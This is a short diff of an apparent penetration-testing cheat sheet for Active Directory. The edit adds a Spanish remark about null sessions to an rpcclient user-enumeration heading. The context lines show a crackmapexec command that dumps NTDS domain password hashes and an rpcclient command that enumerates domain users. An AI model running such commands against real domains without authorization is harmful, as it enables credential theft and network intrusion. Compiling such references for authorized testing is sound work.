@@ -116,7 +116,7 @@ NTDS dumping
 ```
 crackmapexec smb network/address -u users -p passwords --ntds vss
 ```
-Userenum with RPC
+Userenum with RPC (-N para Null Session)
 
 ```
 rpcclient -U 'domain.local\user%password' IP -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x'
